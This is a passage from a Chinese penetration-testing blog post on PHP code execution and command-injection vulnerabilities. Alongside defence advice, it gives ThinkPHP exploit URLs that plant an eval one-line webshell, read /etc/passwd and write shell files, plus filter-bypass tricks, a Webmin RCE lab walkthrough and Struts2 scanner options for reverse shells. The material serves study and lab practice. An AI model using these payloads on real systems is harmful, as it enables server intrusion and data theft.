+<h3 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h3><h4 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h4><p>eval() 函数<strong>把字符串按照 PHP 代码来计算</strong>。该字符串必须是合法的 PHP 代码，且必须以分号结尾。如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p>
+<p>在服务器上创建一下代码test.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>，</span><br><span class="line"><span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>] ; </span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>查看文件：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804103612237.png" alt="image-20220804103612237"></p>
+<p>查看管理员：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://i0.hdslb.com/bfs/article/1809d2c695ee31ad7df983396c96fe9f2e56fb5a.png@831w_98h_progressive.webp" alt="img"></p>
+<p>添加管理员：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://i0.hdslb.com/bfs/article/42c39426697b4bf2945f925da0de0748f9bc0fce.png@696w_65h_progressive.webp" alt="img"></p>
+<h4 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 支持动态调用，但是在php7.0.29之后的版本不支持动态调用</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
+
+<h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h4><p>此函数的作用是对一个字符串进行正则处理。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> $ pattern , <span class="keyword">mixed</span> $ replacement , <span class="keyword">mixed</span> $ subject [, <span class="keyword">int</span> $ limit = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;$ count ]] )</span><br></pre></td></tr></table></figure>
+
+<h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h4><p>把第一参数作为回调函数</p>
+<h4 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h4><p>调用回到函数，并把第一个数组参数作为回到函数的参数</p>
+<h4 id="array-map"><a href="#array-map" class="headerlink" title="array_ map()"></a>array_ map()</h4><p>为数组的每个元素应用回调函数</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>一般找CMS相应版本漏洞，如<strong>ThinkPHP2.1</strong></p>
+<ul>
+<li><p>一句话木马</p>
+<p>给语句加上了${}，令其为变量，可作为动态函数执行。</p>
+<p><code>http://www.xxx.com/News/detail/id/&#123;$&#123;@eval($_POST[aa])&#125;&#125;</code></p>
+</li>
+<li><p>得到当前路径<br><code>http://www.xxx.com/News/detail/id/&#123;$&#123;print(getcwd()))&#125;&#125;</code></p>
+</li>
+<li><p>读文件<br><code>http://www.xxx.com/News/detail/id/&#123;$&#123;exit(var_dump(file_get_contents($_POST[&#39;f&#39;])))&#125;&#125;</code><br>POST的数据为：<code>f=/etc/passwd</code></p>
+</li>
+<li><p>写shell<br><code>http://www.xxx.com/News/detail/id/&#123;$&#123;exit(var_dump(file_put_contents($_POST[&#39;f&#39;],$_POST[d])))&#125;&#125;</code><br>POST的数据为：<code>f=1.php&amp;d=&lt;?php @eval($_POST[&#39;aa&#39;])?&gt;</code></p>
+</li>
+</ul>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul>
+<li><p>少用或禁用命令执行函数</p>
+<p>尽量<strong>少用</strong>执行命令的函数或者直接<strong>禁用</strong>。能使用脚本解决的工作，不要调用其他程序处理。尽量少用执行命令的函数，并在<strong>disable_functions</strong>中禁用</p>
+</li>
+<li><p>确保动态执行的函数为指定的函数</p>
+<p>在使用动态函数之前，确保使用的函数是<strong>指定的函数</strong>之一</p>
+</li>
+<li><p>参数用引号括起，且进行过滤或固定</p>
+<p>在进入执行命令的函数&#x2F;方法之前，<strong>对参数进行过滤，对敏感字符进行转义</strong>。参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义。</p>
+<p>对于可控点是程序参数的情况下，使用escapeshellcmd函数进行过滤，对于可控点是程序参数值的情况下，使用escapeshellarg函数进行过滤</p>
+</li>
+</ul>
+<p>而针对由特定第三方组件引发的漏洞，我们要做的就是及时打补丁，修改安装时的默认配置。</p>
+<p>对于eval( )函数一定要保证用户不能轻易接触eval的参数或者用正则严格判断输入的数据格式。</p>
+<p><strong>对于preg_replace放弃使用&#x2F;e修饰符</strong>。如果必须要用e修饰符，请保证第二个参数中，对于正则匹配出的对象，用单引号包裹 。</p>
+<h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>用户通过浏览器提交操作系统执行命令，由于服务器端 <strong>没有针对执行函数做过滤</strong>，导致在没有指定绝对路径的情况下就执行命令，可能会允许使用者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。</p>
+<p>在操作系统中，<code>&amp;</code>、<code>|</code>、<code>||</code>都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。（<code>||</code>只要满足第一个条件，后面的条件就不再判断，而<code>|</code>要对所有的条件进行判断）</p>
+<p><strong>Windows系统命令拼接：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">“|”：管道符，前面命令标准输出作为后面命令的标准输入。</span><br><span class="line">“&amp;” commandA &amp; commandB 先运行命令A，然后运行命令B</span><br><span class="line">“||” commandA || commandB 运行命令A，如果失败则运行命令B</span><br><span class="line">“&amp;&amp;” commandA &amp;&amp; commandB 运行命令A，如果成功则运行命令B</span><br></pre></td></tr></table></figure>
+
+<p>例题：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62851980/article/details/124166126">https://blog.csdn.net/m0_62851980/article/details/124166126</a></p>
+<h3 id="产生-1"><a href="#产生-1" class="headerlink" title="产生"></a>产生</h3><p><strong>web源码</strong>：Nexus、Webmin、ElasticSearch</p>
+<p><strong>中间件平台</strong>：Weblogic、Apache、Postgresql</p>
+<p><strong>其他环境</strong>：Samba、Supervisord</p>
+<h3 id="函数介绍-1"><a href="#函数介绍-1" class="headerlink" title="函数介绍"></a>函数介绍</h3><h4 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h4><p>system函数可以用来执行一个外部的应用程序并将相应的执行结果输出，函数原型如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(command, return_var)</span><br></pre></td></tr></table></figure>
+
+<p>其中，command是要执行的命令，return_var存放执行命令的执行后的状态值。</p>
+<h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>exec函数可以用来执行一个外部的应用程序。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span> (command, output, return_var)</span><br></pre></td></tr></table></figure>
+
+<p>其中，command是要执行的命令，output是获得执行命令输出的每一行字符串，return_var存放执行命令后的状态值</p>
+<h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h4><p>passthru函数可以用来执行一个UNIX系统命令并显示原始的输出。</p>
+<p>当UNIX系统命令的输出是二进制的数据，并且需要直接返回值给浏览器时，需要使用passthru函数来替代system与exec函数。</p>
+<p>Passthru函数原型如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">passthru</span> (command, return_var)</span><br></pre></td></tr></table></figure>
+
+<p>其中，command是要执行的命令，return_var存放执行命令后的状态值。</p>
+<h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h4><p>执行shell命令并返回输出的字符串，函数原型如下：  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">shell_exec</span>(command)</span><br></pre></td></tr></table></figure>
+
+<p>其中，command是要执行的命令。</p>
+<h4 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h4><p>不返回执行结果，而是返回一个文件指针。</p>
+<h4 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h4><h4 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h4><p>在当前进程空间执行指定程序</p>
+<h4 id="echo"><a href="#echo" class="headerlink" title="echo()"></a>echo()</h4><p>若php代码中，<strong>echo后跟的是反引号括起的内容，则会将该内容作为代码执行并输出结果</strong>，实际调用的将是Shell_exec()。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37348714/article/details/108859203">https://blog.csdn.net/qq_37348714/article/details/108859203</a></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/20200928223911994.png" alt="在这里插入图片描述"></p>
+<p>以墨者学院PHP代码分析溯源（第4题）为例：</p>
+<p>有一网站，已知其php源码内容如下。由于存在解码和压缩函数，因此在在线运行中跑一下得到执行结果，其中echo的内容就是反引号括起的，所以会存在代码执行：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804161324103.png" alt="image-20220804161324103"></p>
+<p>然后进一步使用参数a来进行命令执行：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804161658527.png" alt="image-20220804161658527"></p>
+<p>看到该网站下有一个key开头的php文件，查看该文件内容（注意使用tac绕过对cat命令的过滤）：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804161852678.png" alt="image-20220804161852678"></p>
+<h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><ul>
+<li><p>尽量不要使用命令执行函数</p>
+</li>
+<li><p>客户端提交的变量在进入执行命令函数方法之前，一定要做好过滤，对敏感字符进行转义</p>
+</li>
+<li><p>在使用动态函数之前，确保使用的函数是指定的函数之一</p>
+</li>
+<li><p>对PHP语言来说，不能完全控制的危险函数最好不要使用</p>
+</li>
+</ul>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>绕过对空格的检查：</p>
+<p>比如<code>cat flag.txt</code>，要替换掉空格，且保持仍可执行：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$IFS$<span class="number">1</span>　　　　　　<span class="comment">//$1改成$加其他数字都行，都能当作空格来用</span></span><br><span class="line"></span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line"></span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line"></span><br><span class="line">cat$IFS$<span class="number">9</span>flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;&gt;flag.txt</span><br></pre></td></tr></table></figure>
+
+<p>绕过关键词：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tac flag.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h2><ul>
+<li><p><strong>代码审计</strong></p>
+<p>最主要的方式，借助代码审计工具，非常方便的审计出此类漏洞</p>
+</li>
+<li><p><strong>已知的CMS漏洞</strong></p>
+</li>
+</ul>
+<p>已知的CMS，有很多每年都会爆出来很多此类的漏洞</p>
+<ul>
+<li><p><strong>页面传参查找</strong></p>
+<pre><code>  针对页面有传参的地方，重点关注传入恶意代码尝试，概率相对较低
+</code></pre>
+</li>
+</ul>
+<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="墨者靶场黑盒层-RCE-漏洞检测-公开漏洞"><a href="#墨者靶场黑盒层-RCE-漏洞检测-公开漏洞" class="headerlink" title="墨者靶场黑盒层 RCE 漏洞检测-公开漏洞"></a>墨者靶场黑盒层 RCE 漏洞检测-公开漏洞</h3><p><strong>Webmin未经身份验证的远程代码执行</strong></p>
+<p>Webmin是基于Web的Unix系统管理工具。为了降低 Linux系统的管理难度，有时候会对公司内的Linux主机或VPS系统预装了网页管理工具webmin。</p>
+<p>Webmin的RCE漏洞存在于密码重置页面中。该页面允许未经身份验证的用户通过简单的POST请求执行任意命令。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/whoami101/p/11465877.html">https://www.cnblogs.com/whoami101/p/11465877.html</a></p>
+<p>在注册界面提交后BP抓包，将post的URL改为<code>/password_change.cgi</code>（修改密码的URL），post请求主体改为old等参数。其中使用old参数作为命令执行的入口，令old&#x3D;{shell}：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/009994f56d66a163e07fa85f74ccc4c5737559ec.png@692w_365h_progressive.webp" alt="img"></p>
+<p>这里old&#x3D;ls，所以输出了服务器的当前文件目录（这里是直接在浏览器F12调试中修改的数据包）：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804163823614.png" alt="image-20220804163823614"></p>
+<p>然后令old&#x3D;&#x2F;key.txt读取文件，获得flag。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804164230310.png" alt="image-20220804164230310"></p>
+<h3 id="Javaweb-Struts2-框架类-RCE-漏洞-漏洞层面"><a href="#Javaweb-Struts2-框架类-RCE-漏洞-漏洞层面" class="headerlink" title="Javaweb-Struts2 框架类 RCE 漏洞-漏洞层面"></a>Javaweb-Struts2 框架类 RCE 漏洞-漏洞层面</h3><p><strong>Apache Struts2远程代码执行漏洞（S2-037复现）</strong></p>
+<p>Struts2漏洞检查工具2019版 V2.3 by shack2 20190927</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804190810468.png" alt="image-20220804190810468"></p>
+<p>struts2漏洞扫描工具：<strong>Struts2-Scan</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#工具参数说明（Struts2批量扫描利用工具）：</span><br><span class="line"></span><br><span class="line">---Usage: Struts2Scan.py [OPTIONS]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -i, --info          漏洞信息介绍</span><br><span class="line">  -v, --version       显示工具版本</span><br><span class="line">  -u, --url TEXT      URL地址</span><br><span class="line">  -n, --name TEXT     指定漏洞名称, 漏洞名称详见info</span><br><span class="line">  -f, --file TEXT     批量扫描URL文件, 一行一个URL</span><br><span class="line">  -d, --data TEXT     POST参数, 需要使用的payload使用&#123;exp&#125;填充</span><br><span class="line">  -c, --encode TEXT   页面编码, 默认UTF-8编码</span><br><span class="line">  -p, --proxy TEXT    HTTP代理. 格式为http://ip:port</span><br><span class="line">  -t, --timeout TEXT  HTTP超时时间, 默认10s</span><br><span class="line">  -w, --workers TEXT  批量扫描进程数, 默认为10个进程</span><br><span class="line">  --header TEXT       HTTP请求头, 格式为: key1=value1&amp;key2=value2</span><br><span class="line">  -e, --exec          进入命令执行shell</span><br><span class="line">  --webpath           获取WEB路径</span><br><span class="line">  -r, --reverse TEXT  反弹shell地址, 格式为ip:port</span><br><span class="line">  --upfile TEXT       需要上传的文件路径和名称</span><br><span class="line">  --uppath TEXT       上传的目录和名称,如:/usr/local/tomcat/webapps/ROOT/shell.jsp</span><br><span class="line">  -q, --quiet         关闭打印不存在漏洞的输出，只保留存在漏洞的输出</span><br><span class="line">  -h, --help          Show this message and exit.</span><br></pre></td></tr></table></figure>
+
+<p><strong>专业话语：</strong></p>
+<p>EXP：Exploit漏洞利用代码，运行之后对目标进行攻击。<br>POC：Proof of Concept漏洞验证代码，检测目标是否存在对应漏洞。</p>
+<h3 id="一句话-Webshell-后门原理代码执行-拓展说明"><a href="#一句话-Webshell-后门原理代码执行-拓展说明" class="headerlink" title="一句话 Webshell 后门原理代码执行-拓展说明"></a>一句话 Webshell 后门原理代码执行-拓展说明</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804192441723.png" alt="image-20220804192441723"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804192548559.png" alt="image-20220804192548559"></p>
+<p>菜刀将操作系统的命令写入参数，以post方式传递给网站后门，网站后门通过eval()代码执行来执行系统命令或者代码，从而达到了菜刀远程操作服务器的目的.</p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">ccb</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://frankcao3.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/6.%20RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://frankcao3.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/6.%20RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C')">RCE代码及命令执行</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://frankcao3.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/6.%20RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=RCE代码及命令执行&amp;url=https://frankcao3.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/6.%20RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="rm.copyPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>渗透测试<span class="tagsPageCount">15</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/7.%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">文件包含</div></div></a></div><div class="next-post pull-right"><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/5.CSRF%E3%80%81SSRF"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">CSRF、SSRF</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/0.%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A8%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93" title="渗透测试全流程"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">渗透测试全流程</div></div></a></div><div><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1.%20%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E4%B8%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86" title="基础概念与信息收集"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">基础概念与信息收集</div></div></a></div><div><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.%20SQL%E6%B3%A8%E5%85%A5-WAF%E7%BB%95%E8%BF%87" title="SQL注入-WAF绕过"><img class="cover" src= 